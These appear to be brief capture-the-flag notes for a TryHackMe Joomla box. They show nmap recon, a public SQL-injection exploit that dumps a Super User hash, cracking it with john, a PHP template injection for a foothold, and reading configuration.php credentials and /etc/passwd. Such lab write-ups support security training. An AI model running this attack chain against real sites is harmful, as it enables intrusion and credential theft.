
# recon
```
└─$ nmap -Pn -sVC 10.10.76.21
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-15 12:55 GMT
Nmap scan report for 10.10.76.21 (10.10.76.21)
Host is up (0.089s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-generator: Joomla! - Open Source Content Management
3306/tcp open  mysql   MariaDB (unauthorized)
```

## joomla version
$ curl http://10.10.76.21/administrator/manifests/files/joomla.xml
```
<version>3.7.0</version>
```

```
eaa83fe8b963ab08ce9ab7d4a798de05=f0ur45j8djcnlif2gce6ustpo6
```

# exploit
└─$ wget  https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py 
└─$ python joomla_sql.py http://10.10.39.29/ 
```
2024-01-16 12:21:15 (9.06 MB/s) - ‘joomblah.py’ saved [6040/6040]
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session

```

└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash         
```
spiderman123
```

## php injection in template index.php
# foothold
cat configuration.php
```
public $dbtype = 'mysqli';
public $host = 'localhost';
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';
public $db = 'joomla';
```
sh-4.2$ cat /etc/passwd
```
jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
```

